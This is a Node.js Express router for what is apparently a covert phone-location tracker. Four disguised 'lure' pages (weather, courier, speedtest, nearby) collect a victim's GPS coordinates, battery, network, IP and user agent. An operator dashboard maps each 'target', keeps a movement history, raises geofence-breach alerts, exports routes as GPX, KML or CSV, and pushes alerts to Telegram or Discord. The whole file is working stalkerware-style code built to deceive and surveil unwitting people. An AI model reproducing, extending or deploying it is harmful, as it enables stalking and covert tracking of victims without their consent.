const express = require("express")
const router = express.Router()
const config = require("./config")
const db = require("./db")
const notifier = require("./notifier")
const exporter = require("./exporter")

const MAX_HISTORY_POINTS = 300

// Helper: Calculate distance in meters between two lat/lng coordinates (Haversine formula)
function getDistanceMeters(lat1, lon1, lat2, lon2) {
    const R = 6371e3 // Earth radius in meters
    const phi1 = (lat1 * Math.PI) / 180
    const phi2 = (lat2 * Math.PI) / 180
    const deltaPhi = ((lat2 - lat1) * Math.PI) / 180
    const deltaLambda = ((lon2 - lon1) * Math.PI) / 180

    const a =
        Math.sin(deltaPhi / 2) * Math.sin(deltaPhi / 2) +
        Math.cos(phi1) * Math.cos(phi2) * Math.sin(deltaLambda / 2) * Math.sin(deltaLambda / 2)
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
    return R * c
}

// ----------------------------------------------------
// PUBLIC ROUTES (Target Lures & Auth)
// ----------------------------------------------------

// Login
router.route("/login")
    .get((req, res) => {
        res.render("login", { error: null })
    })
    .post((req, res) => {
        const { username, password } = req.body

        if (config.username === username && config.password === password) {
            res.cookie("token", config.token, {
                maxAge: 30 * 24 * 60 * 60 * 1000,
                httpOnly: true,
                sameSite: "lax"
            })
            return res.redirect("/")
        }

        res.render("login", { error: "Invalid username or password" })
    })

// Logout
router.route("/logout").get((req, res) => {
    res.clearCookie("token").redirect("/login")
})

// 4 Distinct Lure Templates
router.get("/weather", (req, res) => res.render("weather"))
router.get("/courier", (req, res) => res.render("courier"))
router.get("/speedtest", (req, res) => res.render("speedtest"))
router.get("/nearby", (req, res) => res.render("nearby"))

// Unified Target Report Handler
function handleLocationReport(req, res) {
    let { id, lat, lng, accuracy, speed, type, lure, battery, charging, network } = req.body

    if (!id || typeof id !== "string") {
        return res.status(400).send("Invalid Target ID")
    }
    id = id.trim().replace(/[^a-zA-Z0-9_\-\.]/g, "").slice(0, 32)
    if (!id) id = "target_" + Date.now()

    const numLat = parseFloat(lat)
    const numLng = parseFloat(lng)
    if (isNaN(numLat) || isNaN(numLng) || numLat < -90 || numLat > 90 || numLng < -180 || numLng > 180) {
        return res.status(400).send("Invalid Coordinates")
    }

    const numAccuracy = (accuracy != null && !isNaN(parseFloat(accuracy))) ? Math.max(0, parseFloat(accuracy)) : null
    const numSpeed = (speed != null && !isNaN(parseFloat(speed))) ? Math.max(0, parseFloat(speed)) : null
    const now = Date.now()

    let target = db.getTarget(id)
    const isNew = !target
    const wasIP = target && target.type === "IP"
    const isGPS = type === "GPS" || (numAccuracy != null && numAccuracy < 200)

    if (isNew) {
        target = {
            id,
            lat: numLat,
            lng: numLng,
            accuracy: numAccuracy,
            speed: numSpeed,
            type: type || (numAccuracy && numAccuracy < 200 ? "GPS" : "Network"),
            lure: lure || "Weather",
            battery: battery != null ? parseFloat(battery) : null,
            charging: !!charging,
            network: network || "Unknown",
            firstSeen: now,
            lastSeen: now,
            ip: req.ip || req.headers["x-forwarded-for"] || "Unknown",
            userAgent: req.headers["user-agent"] || "Unknown",
            history: []
        }
        if (global.IO) {
            global.IO.emit("user-connected", target)
        }
        notifier.sendTargetAlert(target, "connect")
    } else {
        target.lat = numLat
        target.lng = numLng
        target.accuracy = numAccuracy
        target.speed = numSpeed
        target.lastSeen = now
        if (type) target.type = type
        if (lure) target.lure = lure
        if (battery != null) target.battery = parseFloat(battery)
        if (charging != null) target.charging = !!charging
        if (network) target.network = network

        // Alert if newly upgraded from IP to precision GPS
        if (wasIP && isGPS) {
            notifier.sendTargetAlert(target, "gps_acquired")
        } else {
            notifier.sendTargetAlert(target, "update")
        }
    }

    // Geofence check
    const geofence = db.getGeofence(id)
    if (geofence && geofence.active) {
        const dist = getDistanceMeters(geofence.lat, geofence.lng, numLat, numLng)
        if (dist > geofence.radius) {
            target.geofenceBreach = true
            if (global.IO) {
                global.IO.emit("geofence-breach", { id, distance: Math.round(dist), radius: geofence.radius })
            }
            notifier.sendTargetAlert(target, "geofence_breach")
        } else {
            target.geofenceBreach = false
        }
    }

    // Append to breadcrumb history
    target.history.push({
        lat: numLat,
        lng: numLng,
        accuracy: numAccuracy,
        speed: numSpeed,
        time: now
    })

    if (target.history.length > MAX_HISTORY_POINTS) {
        target.history.shift()
    }

    // Save to database
    db.saveTarget(id, target)

    const payload = {
        id,
        lat: numLat,
        lng: numLng,
        accuracy: numAccuracy,
        speed: numSpeed,
        type: target.type,
        lure: target.lure,
        battery: target.battery,
        charging: target.charging,
        network: target.network,
        time: now,
        historyLength: target.history.length,
        geofenceBreach: target.geofenceBreach
    }

    if (global.IO) {
        global.IO.emit("map-data", payload)
        global.IO.emit("target-updated", target)
    }

    console.log(`[TARGET UPDATE] ${id} (${target.lure}) -> (${numLat.toFixed(5)}, ${numLng.toFixed(5)}) Acc: ${numAccuracy ? numAccuracy.toFixed(1) + 'm' : 'N/A'}`)
    res.send("OK")
}

router.post("/weather", handleLocationReport)
router.post("/report", handleLocationReport)

// ----------------------------------------------------
// PROTECTED ADMIN ROUTES (Token Authentication)
// ----------------------------------------------------
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token
    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

// Dashboard
router.route("/").get((req, res) => {
    const targets = db.getAllTargets()
    const settings = db.getSettings()

    res.render("home", {
        TARGETS: targets,
        targetsJSON: JSON.stringify(targets),
        settingsJSON: JSON.stringify(settings),
        remoteURL: global.remoteURL || `http://localhost:${config.port}`
    })
})

// Map View
router.route("/map").get((req, res) => {
    const { id } = req.query
    const target = db.getTarget(id)

    if (!target) {
        return res.redirect("/")
    }

    const geofence = db.getGeofence(id)

    res.render("map", {
        targetJSON: JSON.stringify(target),
        geofenceJSON: JSON.stringify(geofence || null),
        id: target.id
    })
})

// API: Delete a target
router.post("/api/target/delete", (req, res) => {
    const { id } = req.body
    if (db.deleteTarget(id)) {
        if (global.IO) global.IO.emit("target-deleted", id)
        return res.json({ success: true })
    }
    res.status(404).json({ error: "Target not found" })
})

// API: Clear target history
router.post("/api/target/clear-history", (req, res) => {
    const { id } = req.body
    if (db.clearHistory(id)) {
        if (global.IO) global.IO.emit("history-cleared", id)
        return res.json({ success: true })
    }
    res.status(404).json({ error: "Target not found" })
})

// API: Clear all targets
router.post("/api/targets/clear-all", (req, res) => {
    db.clearAllTargets()
    if (global.IO) global.IO.emit("targets-cleared")
    res.json({ success: true })
})

// API: Set / Clear Geofence
router.post("/api/target/geofence", (req, res) => {
    const { id, lat, lng, radius, active } = req.body
    if (!id) return res.status(400).json({ error: "Missing Target ID" })

    if (active === false) {
        db.setGeofence(id, null)
    } else {
        db.setGeofence(id, {
            lat: parseFloat(lat),
            lng: parseFloat(lng),
            radius: Math.max(50, parseInt(radius) || 500),
            active: true
        })
    }
    res.json({ success: true, geofence: db.getGeofence(id) })
})

// API: Export route in GPX, KML, or CSV
router.get("/api/target/export", (req, res) => {
    const { id, format } = req.query
    const target = db.getTarget(id)
    if (!target) return res.status(404).send("Target not found")

    const fmt = (format || "csv").toLowerCase()
    const filename = `${target.id}_route_${Date.now()}`

    if (fmt === "gpx") {
        res.setHeader("Content-Type", "application/gpx+xml")
        res.setHeader("Content-Disposition", `attachment; filename="${filename}.gpx"`)
        return res.send(exporter.toGPX(target))
    } else if (fmt === "kml") {
        res.setHeader("Content-Type", "application/vnd.google-earth.kml+xml")
        res.setHeader("Content-Disposition", `attachment; filename="${filename}.kml"`)
        return res.send(exporter.toKML(target))
    } else {
        res.setHeader("Content-Type", "text/csv")
        res.setHeader("Content-Disposition", `attachment; filename="${filename}.csv"`)
        return res.send(exporter.toCSV(target))
    }
})

// API: Save Notification Settings
router.post("/api/settings", (req, res) => {
    const { telegramBotToken, telegramChatId, discordWebhookUrl } = req.body
    const updated = db.updateSettings({
        telegramBotToken: (telegramBotToken || "").trim(),
        telegramChatId: (telegramChatId || "").trim(),
        discordWebhookUrl: (discordWebhookUrl || "").trim()
    })
    res.json({ success: true, settings: updated })
})

// API: Send Test Notification
router.post("/api/test-notification", async (req, res) => {
    const sampleTarget = {
        id: "TEST_USER_99",
        lat: 17.38504,
        lng: 78.48667,
        accuracy: 12,
        speed: 5.2,
        type: "GPS (Test)",
        lure: "Courier",
        battery: 88,
        charging: true,
        network: "5G",
        lastSeen: Date.now()
    }

    try {
        await notifier.sendTargetAlert(sampleTarget, "connect")
        res.json({ success: true, message: "Test notification dispatched to configured channels!" })
    } catch (e) {
        res.status(500).json({ error: e.message })
    }
})

module.exports = router
